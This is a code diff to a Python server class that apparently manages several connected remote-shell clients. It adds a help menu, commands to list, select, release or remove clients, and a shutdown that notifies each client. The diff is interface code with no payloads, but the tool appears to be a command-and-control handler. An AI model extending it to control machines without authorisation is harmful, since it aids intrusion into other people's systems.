@@ -1,3 +1,4 @@
+import click
 import socket
 import sys
 import threading
@@ -24,6 +25,21 @@ class ShellService:
         self.server_socket = None
         self.sockets_list = []
         self.address_list = []
+
+        # List of commands
+        self.COMMANDS = {
+            '\n---Prompt Commands---': 'Commands recognized by the server prompt',
+            'list': 'List all connected clients\n',
+            'select': 'Select the client you want to manage\n'
+                      + '\t[argument: Integer value corresponding to connection]',
+            'exit()': 'Terminates the running server and removes all established connections\n\n',
+
+            '---Client Commands---': 'Special commands recognized by the client prompt',
+            'remove': 'Removes the current client connection from the server\n',
+            'quit': 'Returns back to the main prompt retaining\n'
+                    + '\tthe connection with the selected client',
+            'help': 'Display this help message\n'
+        }
 
     def _send_command(self, sock, cmd):
         """Encodes and sends commands to the client"""
@@ -55,6 +71,9 @@ class ShellService:
         """Purges all existing connections"""
         for conn in self.sockets_list:
             try:
+                # First send a message to each client
+                # notifying them that the server is no longer available
+                self._send_command(conn, 'remove')
                 conn.shutdown(socket.SHUT_RDWR)
                 conn.close()
             except socket.error:
@@ -108,13 +127,20 @@ class ShellService:
             try:
                 cmd = input()
 
-                if cmd == 'quit':
+                # User wants to remove the client connection
+                if cmd == 'remove':
                     self._send_command(conn, cmd)
 
                     # Update the appropriate lists
                     indx = self.sockets_list.index(conn)
                     del self.sockets_list[indx]
                     del self.address_list[indx]
+                    break
+
+                # User wants to retain the client connection and
+                # return to the main shell prompt
+                if cmd == 'quit':
+                    self._send_command(conn, cmd)
                     break
 
                 if cmd:
@@ -142,7 +168,7 @@ class ShellService:
             return conn
 
         except:
-            print("[-] Not a valid selection")
+            print("[-] Not a valid selection\n")
             return None
 
     def interactive_prompt(self):
@@ -153,11 +179,11 @@ class ShellService:
             if cmd == 'list':
                 self.list_connections()
 
+            elif cmd == 'clear':
+                click.clear()
+
             # Parse input
-            elif cmd == ('quit' or 'shutdown'):
-                # End the daemon tasks
-                client_queue.task_done()
-                client_queue.task_done()
+            elif cmd == 'exit()':
                 # Kill all connections
                 self.stop()
                 break
@@ -169,11 +195,19 @@ class ShellService:
                 if conn:
                     self.send_target_commands(conn)
 
+            elif cmd == 'help':
+                self.display_help()
+
             elif cmd == '':
                 pass
             else:
-                print("[-] Command not recognized")
+                print("[-] Command not recognized\n")
         return
+
+    def display_help(self):
+        """Displays a list of available commands"""
+        for cmd, hlp in self.COMMANDS.items():
+            print("{0} : {1}".format(cmd, hlp))
 
     def job_handler(self):
         """
